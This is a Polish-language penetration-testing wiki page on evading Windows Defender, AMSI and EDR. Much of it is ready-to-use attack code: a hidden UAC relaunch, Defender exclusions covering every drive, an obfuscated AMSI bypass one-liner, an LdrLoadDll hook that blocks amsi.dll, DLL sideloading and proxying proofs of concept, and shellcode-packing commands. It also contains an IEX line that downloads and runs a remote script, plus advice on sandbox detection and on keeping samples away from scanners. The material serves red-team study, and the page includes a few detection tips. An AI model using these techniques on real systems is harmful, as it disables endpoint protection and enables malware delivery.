# Obejście AV

{{#include ../banners/hacktricks-training.md}}

**Ta strona została pierwotnie napisana przez** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zatrzymaj Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie zatrzymujące działanie Windows Defendera.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie zatrzymujące działanie Windows Defendera poprzez podszywanie się pod inny AV.
- [Wyłącz Defendera, jeśli masz uprawnienia administratora](basic-powershell-for-pentesters/README.md)

### Przynęta UAC w stylu instalatora przed manipulowaniem Defenderem

Publiczne loadery podszywające się pod cheaty do gier często są dostarczane jako niepodpisane instalatory Node.js/Nexe, które najpierw **proszą użytkownika o podwyższenie uprawnień**, a dopiero potem unieszkodliwiają Defendera. Schemat jest prosty:

1. Sprawdź, czy proces działa z uprawnieniami administratora, za pomocą `net session`. Polecenie powiedzie się tylko wtedy, gdy wywołujący ma uprawnienia administratora, więc niepowodzenie oznacza, że loader działa jako zwykły użytkownik.
2. Natychmiast uruchom ponownie sam loader z użyciem czasownika `RunAs`, aby wywołać oczekiwany monit UAC o zgodę, zachowując oryginalny wiersz poleceń.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Ofiary już wierzą, że instalują „crackowane” oprogramowanie, więc zwykle akceptują monit, przyznając malware uprawnienia potrzebne do zmiany zasad Defendera.<sup>[[26]](#references)</sup>

### Wykluczenia `MpPreference` obejmujące wszystkie litery dysków

Po uzyskaniu podwyższonych uprawnień łańcuchy w stylu GachiLoadera maksymalizują martwe pola Defendera, zamiast całkowicie wyłączać usługę. Loader najpierw kończy działanie strażnika GUI (`taskkill /F /IM SecHealthUI.exe`), a następnie dodaje **niezwykle szerokie wykluczenia**, aby skanowanie nie obejmowało żadnego profilu użytkownika, katalogu systemowego ani dysku wymiennego:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Kluczowe obserwacje:

- Pętla przechodzi przez każdy zamontowany system plików (D:\, E:\, pamięci USB itd.), więc **każdy przyszły payload umieszczony w dowolnym miejscu na dysku zostanie pominięty**.
- Wykluczenie rozszerzenia `.sys` jest przewidziane na przyszłość — atakujący zachowują sobie możliwość późniejszego załadowania niepodpisanych sterowników bez ponownego ingerowania w Defendera.
- Wszystkie zmiany trafiają do `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, dzięki czemu kolejne etapy mogą potwierdzić, że wykluczenia nadal obowiązują, lub je rozszerzyć bez ponownego wywoływania UAC.

Ponieważ żadna usługa Defendera nie zostaje zatrzymana, pobieżne kontrole stanu nadal zgłaszają, że „antywirus jest aktywny”, mimo że ochrona w czasie rzeczywistym nie sprawdza tych ścieżek.<sup>[[26]](#references)</sup>

## **Metodologia unikania wykrycia przez AV**

Obecnie AV używają różnych metod sprawdzania, czy plik jest złośliwy: wykrywania statycznego, analizy dynamicznej, a w przypadku bardziej zaawansowanych EDR-ów — analizy behawioralnej.

### **Wykrywanie statyczne**

Wykrywanie statyczne polega na oznaczaniu znanych złośliwych ciągów znaków lub tablic bajtów w pliku binarnym albo skrypcie, a także na wyodrębnianiu informacji z samego pliku (np. opisu pliku, nazwy firmy, podpisów cyfrowych, ikony, sumy kontrolnej itp.). Oznacza to, że używanie znanych, publicznych narzędzi może sprawić, że łatwiej zostaniesz wykryty, ponieważ prawdopodobnie zostały już przeanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów na ominięcie tego rodzaju wykrywania:

- **Szyfrowanie**

Jeśli zaszyfrujesz plik binarny, AV nie będzie w stanie wykryć programu, ale będziesz potrzebować jakiegoś loadera, który odszyfruje i uruchomi program w pamięci.

- **Obfuskacja**

Czasami wystarczy zmienić kilka ciągów znaków w pliku binarnym lub skrypcie, aby ominąć AV, ale w zależności od tego, co próbujesz zaciemnić, może to być czasochłonne.

- **Własne narzędzia**

Jeśli opracujesz własne narzędzia, nie będą istnieć znane sygnatury wskazujące na zagrożenie, ale wymaga to dużo czasu i wysiłku.

> [!TIP]
> Dobrym narzędziem do sprawdzania wykrywania statycznego przez Windows Defender jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dzieli ono plik na wiele segmentów, a następnie zleca Defenderowi skanowanie każdego z nich osobno. Dzięki temu może dokładnie wskazać oznaczone ciągi znaków lub bajty w pliku binarnym.

Gorąco polecam zapoznanie się z tą [playlistą na YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) poświęconą praktycznemu unikaniu wykrycia przez AV.

### Testy cech PE offline dla klasyfikatorów statycznych

Spakowane lub zaszyfrowane bajty payloadu to tylko jedno z wejść klasyfikatora statycznego. EMBER2024 wyodrębnia cechy PE, w tym importy, eksporty, sekcje, nagłówki i dane Authenticode.<sup>[[48]](#references)</sup> W jednym eksperymencie z loaderem dodanie 141 importów wyglądających na nieszkodliwe obniżyło wynik szkodliwości EMBER2024 o 93%, podczas gdy importy powiązane ze złośliwym oprogramowaniem go podwyższyły. Jest to wynik uzyskany dla tego modelu i tych próbek, a nie niezawodny sposób na ominięcie konkretnego produktu AV/EDR.<sup>[[50]](#references)</sup>

W ramach autoryzowanego testu loadera utrzymuj payload i ścieżkę wykonania bez zmian, modyfikuj jedną zamierzoną zmienną kompilacji w każdym wariancie i porównuj wyniki offline. Sprawdź uzyskane cechy PE, ponieważ zmiana kompilacji może wpłynąć na więcej niż jedną grupę cech.<sup>[[49]](#references)[[50]](#references)</sup> Aby zachować zamierzone importy w IAT, wywołuj wybrane API Win32 z osiągalnego kodu. Zmieniaj wybór i rozmieszczaj miejsca wywołań między kompilacjami, zamiast tworzyć stałą funkcję maskującą, która może stać się sygnaturą. W eksperymencie odnotowano również niższe wyniki przy prawidłowym podpisywaniu kodu, wpisach eksportu i większej liczbie funkcji powiększających `.pdata`; nieprawidłowy podpis miał niewielki wpływ, a wpływ `.pdata` był mały.<sup>[[50]](#references)</sup>

Pakiet `thrember` udostępnia ekstrakcję cech i modele benchmarkowe. Po jego zainstalowaniu użyj `thrember.download_models("models")` z istniejącym katalogiem `models`, a następnie uruchom klasyfikator z katalogu nadrzędnego: funkcja pomocnicza pobierająca modele zmienia bieżący katalog roboczy. Klasyfikator PE może oceniać katalog z kompilacjami bez przesyłania ich do usługi skanującej:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Keep model i wersje ekstraktora cech niezmienione podczas porównania. Niższy wynik offline pokazuje jedynie, jak ten klasyfikator reaguje na zmieniony plik binarny; nie dowodzi to uniknięcia analizy behawioralnej, emulacji ani innego modelu dostawcy.<sup>[[49]](#references)[[50]](#references)</sup> Informacje o [polimorfizmie dla każdej kompilacji i kamuflażu zewnętrznego pliku binarnego w zwirtualizowanych payloadach](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) znajdziesz w osobnym modelu wykonywania.

### **Analiza dynamiczna**

Analiza dynamiczna polega na tym, że AV uruchamia twój plik binarny w sandboxie i obserwuje szkodliwą aktywność (np. próby odszyfrowania i odczytania haseł z przeglądarki, wykonanie minidumpa LSASS itp.). Ta część może być nieco trudniejsza, ale oto kilka rzeczy, które możesz zrobić, aby uniknąć sandboxów.

- **Uśpienie przed wykonaniem** W zależności od implementacji może to być świetny sposób na ominięcie analizy dynamicznej AV. AV ma bardzo mało czasu na skanowanie plików, aby nie zakłócać pracy użytkownika, więc długie uśpienie może utrudnić analizę plików binarnych. Problem polega na tym, że wiele sandboxów AV może po prostu pominąć uśpienie, zależnie od sposobu jego implementacji.
- **Sprawdzanie zasobów maszyny** Zazwyczaj sandboxy dysponują bardzo ograniczonymi zasobami (np. < 2GB RAM), w przeciwnym razie mogłyby spowalniać maszynę użytkownika. Możesz też wykazać się dużą kreatywnością, na przykład sprawdzając temperaturę CPU albo prędkość wentylatorów — nie wszystko będzie zaimplementowane w sandboxie.
- **Kontrole specyficzne dla maszyny** Jeśli chcesz zaatakować użytkownika, którego stacja robocza jest dołączona do domeny „contoso.local”, możesz sprawdzić domenę komputera i ustalić, czy odpowiada tej, którą określiłeś. Jeśli nie, możesz zakończyć działanie programu.

Okazuje się, że nazwa komputera w sandboxie Microsoft Defender to HAL9TH. Możesz więc przed detonacją sprawdzić nazwę komputera w swoim malware. Jeśli nazwa to HAL9TH, oznacza to, że jesteś w sandboxie Defendera, więc możesz zakończyć działanie programu.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>źródło: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych naprawdę dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących omijania sandboxów:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanał #malware-dev</p></figcaption></figure>

Jak już wcześniej wspomnieliśmy w tym poście, **publiczne narzędzia** prędzej czy później **zostaną wykryte**, więc warto zadać sobie jedno pytanie:

Na przykład, jeśli chcesz zrzucić LSASS, **czy naprawdę musisz użyć mimikatz**? A może możesz użyć innego, mniej znanego projektu, który również zrzuca LSASS?

Prawdopodobnie właściwa jest ta druga opcja. Weźmy mimikatz jako przykład: to prawdopodobnie jeden z najczęściej oznaczanych przez AV i EDR malware, jeśli nie ten najczęściej oznaczany. Sam projekt jest świetny, ale bardzo trudno go używać do omijania AV, więc po prostu poszukaj alternatyw, które pozwolą osiągnąć twój cel.

> [!TIP]
> Modyfikując payloady w celu uniknięcia wykrycia, pamiętaj, aby **wyłączyć automatyczne przesyłanie próbek** w Defenderze i, proszę, naprawdę, **NIE PRZESYŁAJ ICH DO VIRUSTOTAL**, jeśli chcesz długofalowo unikać wykrycia. Jeśli chcesz sprawdzić, czy dany AV wykrywa twój payload, zainstaluj go na maszynie wirtualnej, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj go tam, aż uzyskasz satysfakcjonujący wynik.

## EXE a DLL

Jeśli to możliwe, zawsze **preferuj użycie DLL w celu uniknięcia wykrycia**. Z mojego doświadczenia wynika, że pliki DLL są zwykle **znacznie rzadziej wykrywane** i analizowane, więc w niektórych przypadkach jest to bardzo prosty sposób na uniknięcie wykrycia (oczywiście jeśli twój payload może działać jako DLL).

Jak widać na tym obrazie, payload DLL z Havoc ma współczynnik wykrywalności 4/26 w antiscan.me, a payload EXE — 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>porównanie antiscan.me zwykłego payloadu EXE Havoc ze zwykłą biblioteką DLL Havoc</p></figcaption></figure>

Teraz pokażemy kilka sztuczek, które możesz zastosować z plikami DLL, aby działać znacznie bardziej ukrycie.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL stosowaną przez loader, umieszczając aplikację ofiary i złośliwe payloady obok siebie.

Możesz sprawdzić, które programy są podatne na DLL Sideloading, używając [Siofra](https://github.com/Cybereason/siofra) i poniższego skryptu powershell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

To polecenie wyświetli listę programów podatnych na DLL hijacking w lokalizacji "C:\Program Files\\" oraz pliki DLL, które próbują załadować.

Gorąco polecam samodzielnie **wyszukiwać programy podatne na DLL Hijacking/Sideloading**. Ta technika jest dość stealthy, jeśli zostanie poprawnie zastosowana, ale użycie publicznie znanych programów podatnych na DLL Sideloading może sprawić, że łatwo zostaniesz wykryty.

Samo umieszczenie złośliwej biblioteki DLL o nazwie, której program oczekuje, nie spowoduje załadowania payloadu, ponieważ program oczekuje określonych funkcji w tej bibliotece DLL. Aby rozwiązać ten problem, użyjemy innej techniki o nazwie **DLL Proxying/Forwarding**.

**DLL Proxying** przekazuje wywołania wykonywane przez program z biblioteki DLL proxy (i złośliwej) do oryginalnej biblioteki DLL, zachowując w ten sposób funkcjonalność programu i umożliwiając obsługę wykonania payloadu.

Skorzystam z projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/).

Oto kroki, które wykonałem:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Ostatnie polecenie da nam 2 pliki: szablon kodu źródłowego DLL oraz oryginalną bibliotekę DLL o zmienionej nazwie.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Oto wyniki:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL mają wskaźnik wykrywalności 0/26 w [antiscan.me](https://antiscan.me)! Można to uznać za sukces.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Gorąco polecam** obejrzeć [nagranie VOD z twitcha S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) na temat DLL Sideloading, a także [film ippseca](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dowiedzieć się więcej o omówionych zagadnieniach.

### Nadużywanie Forwarded Exports (ForwardSideLoading)

Moduły PE systemu Windows mogą eksportować funkcje, które są w rzeczywistości „forwarderami”: zamiast wskazywać na kod, wpis eksportu zawiera ciąg ASCII w formacie `TargetDll.TargetFunc`. Gdy wywołujący rozwiązuje eksport, loader systemu Windows:

- Ładuje `TargetDll`, jeśli nie został jeszcze załadowany
- Rozwiązuje w nim `TargetFunc`

Ważne zachowania:
- Jeśli `TargetDll` jest KnownDLL, jest dostarczany z chronionej przestrzeni nazw KnownDLLs (np. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Jeśli `TargetDll` nie jest KnownDLL, używana jest standardowa kolejność wyszukiwania DLL, która obejmuje katalog modułu wykonującego przekazywanie.

Umożliwia to pośrednią primitive sideloadingu: znajdź podpisaną DLL, która eksportuje funkcję przekazywaną do modułu o nazwie niebędącej KnownDLL, a następnie umieść obok niej kontrolowaną przez atakującego DLL o dokładnie takiej nazwie jak docelowy moduł. Gdy zostanie wywołany przekazywany eksport, loader rozwiąże przekazanie i załaduje twoją DLL z tego samego katalogu, wykonując jej DllMain.<sup>[[13]](#references)</sup>

Przykład zaobserwowany w systemie Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` nie jest KnownDLL, więc jest wyszukiwany zgodnie ze standardową kolejnością wyszukiwania.

PoC (kopiuj-wklej):
1) Skopiuj podpisaną systemową bibliotekę DLL do folderu z prawem zapisu.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Umieść złośliwy plik `NCRYPTPROV.dll` w tym samym folderze. Minimalny `DllMain` wystarczy, aby wykonać kod; nie musisz implementować przekazywanej funkcji, aby wywołać `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Uruchom przekierowanie za pomocą podpisanego LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Zaobserwowane zachowanie:
- rundll32 (podpisany) ładuje bibliotekę side-by-side `keyiso.dll` (podpisaną)
- Podczas rozwiązywania `KeyIsoSetAuditingInterface` loader podąża za przekierowaniem do `NCRYPTPROV.SetAuditingInterface`
- Następnie loader ładuje `NCRYPTPROV.dll` z `C:\test` i wykonuje jej `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowana, błąd „missing API” pojawi się dopiero po wykonaniu `DllMain`

Wskazówki dotyczące poszukiwań:
- Skup się na przekierowanych eksportach, których moduł docelowy nie jest KnownDLL. KnownDLL są wymienione w `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Przekierowane eksporty można wyliczyć za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz spis forwarderów w Windows 11, aby wyszukać kandydatów: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Pomysły na wykrywanie/obronę:
- Monitoruj LOLBins (np. rundll32.exe) ładujące podpisane DLL-e ze ścieżek spoza katalogów systemowych, a następnie ładujące pliki spoza KnownDLLs o tej samej nazwie bazowej z tego katalogu
- Generuj alerty dotyczące łańcuchów procesów/modułów, takich jak: `rundll32.exe` → `keyiso.dll` spoza katalogów systemowych → `NCRYPTPROV.dll` ze ścieżek zapisywalnych przez użytkownika
- Wymuszaj zasady integralności kodu (WDAC/AppLocker) i blokuj jednoczesny zapis i wykonywanie w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze to zestaw narzędzi do obsługi payloadów, umożliwiający omijanie EDR-ów przy użyciu zawieszonych procesów, bezpośrednich wywołań syscalli i alternatywnych metod wykonywania`

Możesz użyć Freeze, aby w ukryty sposób załadować i wykonać swój shellcode.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion to gra w kotka i myszkę — to, co działa dziś, może zostać wykryte jutro, więc nigdy nie polegaj tylko na jednym narzędziu; jeśli to możliwe, spróbuj łączyć różne techniki evasion.

## Bezpośrednie/pośrednie Syscalls i rozwiązywanie SSN (SysWhispers4)

EDR-y często umieszczają **hooki inline w trybie użytkownika** w stubach syscall w `ntdll.dll`. Aby ominąć te hooki, możesz wygenerować stuby syscall **bezpośrednie** lub **pośrednie**, które ładują prawidłowy **SSN** (System Service Number) i przechodzą do trybu jądra bez wykonywania podpiętego punktu wejścia eksportu.<sup>[[32]](#references)</sup>

**Opcje wywołania:**
- **Direct (osadzony)**: emituje instrukcję `syscall`/`sysenter`/`SVC #0` w wygenerowanym stubie (bez wywołania eksportu `ntdll`).
- **Indirect**: wykonuje skok do istniejącego gadżetu `syscall` w `ntdll`, dzięki czemu przejście do jądra wygląda tak, jakby pochodziło z `ntdll` (przydatne do evasion heurystycznego); **randomized indirect** wybiera gadżet z puli przy każdym wywołaniu.
- **Egg-hunt**: unika osadzania statycznej sekwencji opcode `0F 05` na dysku; wyszukuje sekwencję syscall w czasie działania.

**Strategie rozwiązywania SSN odporniejsze na hooki:**
- **FreshyCalls (sortowanie VA)**: określa SSN przez sortowanie stubów syscall według adresu wirtualnego zamiast odczytywania bajtów stubów.
- **SyscallsFromDisk**: mapuje czystą kopię `\KnownDlls\ntdll.dll`, odczytuje SSN z jej sekcji `.text`, a następnie ją odmapowuje (omija wszystkie hooki w pamięci).
- **RecycledGate**: łączy określanie SSN przez sortowanie VA z walidacją opcode, gdy stub jest czysty; w przypadku hooka używa określania przez VA.
- **HW Breakpoint**: ustawia DR0 na instrukcji `syscall` i używa VEH do przechwycenia SSN z `EAX` w czasie działania, bez analizowania podpiętych bajtów.

Przykładowe użycie SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI stworzono, aby zapobiegać „[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)”. Początkowo AV potrafił skanować tylko **pliki na dysku**, więc jeśli udało Ci się jakoś uruchomić payloady **bezpośrednio w pamięci**, AV nie mógł temu zapobiec, ponieważ nie miał wystarczającego wglądu.

Funkcja AMSI jest zintegrowana z następującymi składnikami systemu Windows.

- Kontrola konta użytkownika, czyli UAC (podwyższanie uprawnień EXE, COM, MSI lub instalacji ActiveX)
- PowerShell (skrypty, użycie interaktywne i dynamiczna ewaluacja kodu)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Makra Office VBA

Umożliwia rozwiązaniom antywirusowym analizowanie działania skryptów poprzez udostępnianie ich zawartości w postaci niezaszyfrowanej i nieobfuskowanej.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` spowoduje wyświetlenie następującego alertu w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zwróć uwagę, że na początku dodaje `amsi:`, a następnie ścieżkę do pliku wykonywalnego, z którego uruchomiono skrypt — w tym przypadku powershell.exe.

Nie zapisaliśmy żadnego pliku na dysku, a mimo to zostaliśmy wykryci w pamięci przez AMSI.

Co więcej, począwszy od **.NET 4.8**, kod C# również jest sprawdzany przez AMSI. Dotyczy to nawet użycia `Assembly.Load(byte[])` do załadowania kodu wykonywanego w pamięci. Dlatego do wykonywania kodu w pamięci, jeśli chcesz ominąć AMSI, zaleca się używanie starszych wersji .NET (takich jak 4.7.2 lub niższe).

Istnieje kilka sposobów na obejście AMSI:

- **Obfuskacja**

Ponieważ AMSI opiera się głównie na statycznym wykrywaniu, modyfikowanie skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie wykrycia.

AMSI potrafi jednak usunąć obfuskację ze skryptów nawet wtedy, gdy mają wiele warstw, więc obfuskacja może być złym rozwiązaniem — zależnie od sposobu jej zastosowania. Ominięcie wykrywania nie jest więc takie proste. Czasami wystarczy jednak zmienić kilka nazw zmiennych, aby uniknąć wykrycia, więc zależy to od tego, w jakim stopniu coś zostało oznaczone.

- **AMSI Bypass**

Ponieważ AMSI jest implementowane przez załadowanie biblioteki DLL do procesu powershell (a także cscript.exe, wscript.exe itd.), można łatwo manipulować jego działaniem, nawet jako nieuprzywilejowany użytkownik. Z powodu tej wady w implementacji AMSI badacze znaleźli wiele sposobów na uniknięcie skanowania AMSI.

**Wymuszanie błędu**

Wymuszenie niepowodzenia inicjalizacji AMSI (amsiInitFailed) sprawi, że bieżący proces nie rozpocznie skanowania. Pierwotnie ujawnił to [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę, aby zapobiec powszechnemu stosowaniu tej metody.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Wystarczył jeden wiersz kodu PowerShell, aby unieszkodliwić AMSI w bieżącym procesie PowerShell. Ten wiersz został oczywiście wykryty przez samo AMSI, więc aby skorzystać z tej techniki, trzeba go zmodyfikować.

Oto zmodyfikowany AMSI bypass, który zaczerpnąłem z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Pamiętaj, że po opublikowaniu tego wpisu prawdopodobnie zostanie on wykryty, więc jeśli chcesz pozostać niewykryty, nie publikuj żadnego kodu.

**Memory Patching**

Ta technika została pierwotnie odkryta przez [@RastaMouse](https://twitter.com/_RastaMouse/) i polega na znalezieniu adresu funkcji „AmsiScanBuffer” w amsi.dll (odpowiedzialnej za skanowanie danych wejściowych dostarczonych przez użytkownika) i nadpisaniu jej instrukcjami zwracającymi kod E_INVALIDARG. Dzięki temu wynik właściwego skanowania wyniesie 0, co jest interpretowane jako czysty wynik.

> [!TIP]
> Przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/), aby uzyskać bardziej szczegółowe wyjaśnienie.

Istnieje też wiele innych technik omijania AMSI w powershellu. Więcej informacji znajdziesz na [**tej stronie**](basic-powershell-for-pentesters/index.html#amsi-bypass) i w [**tym repozytorium**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Przekierowanie wskaźnika skanowania AMSI COM zamiast patchowania `AmsiScanBuffer`

Inny bypass ograniczony do lokalnego procesu pozostawia punkt wejścia `AmsiScanBuffer` bez zmian. W opisanym 64-bitowym loaderze .NET obiekt AMSI COM jest tworzony na podstawie CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec`; `Marshal.GetIUnknownForObject()` zwraca wskaźnik interfejsu, a slot jego vtable pod offsetem `0x18` jest używany jako cel wywołania skanowania. Loader patchuje natywny wskaźnik `Console.Clear()` niewielkim stubem x64, zmienia ten wpis vtable na stub za pomocą `VirtualProtect()`, a następnie przywraca pierwotne uprawnienia strony. Wymagane są zarówno 64-bitowa szerokość wskaźnika, jak i oczekiwany układ COM; nie jest to uniwersalny offset dla dowolnych interfejsów AMSI ani kompilacji. Wcześniej zaobserwowane etapy to [ładowanie podpisanego pliku sidecar AppDomainManager](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) oraz [deserializacja RESX](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Zaobserwowane bajty stubu to `41 C7 00 01 00 00 00 33 C0 C3`: zapisują **1** pod wskaźnikiem wyniku w `r8` i zwracają **0** w `eax`. Zatem przedstawione twierdzenie, że wynik skanowania to `AMSI_RESULT_CLEAN` (0), myli wartość zwracaną `S_OK` z wyliczeniową wartością wyjściową. W udokumentowanej kolejności `AMSI_RESULT` wartość **1** oznacza `AMSI_RESULT_NOT_DETECTED`; nadal jest poniżej progu wykrycia.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Blokowanie AMSI przez uniemożliwienie załadowania amsi.dll (hook LdrLoadDll)

AMSI jest inicjowane dopiero po załadowaniu amsi.dll do bieżącego procesu. Solidny bypass, niezależny od języka, polega na założeniu hooka w trybie użytkownika na `ntdll!LdrLoadDll`, który zwraca błąd, gdy żądanym modułem jest `amsi.dll`. W rezultacie AMSI nie zostaje załadowane i w tym procesie nie odbywają się żadne skanowania.<sup>[[23]](#references)</sup>

Zarys implementacji (pseudokod x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Uwagi
- Działa z PowerShell, WScript/CScript i niestandardowymi loaderami (ze wszystkim, co w innym przypadku ładowałoby AMSI).
- Połącz z przekazywaniem skryptów przez stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), aby uniknąć długich artefaktów w wierszu poleceń.
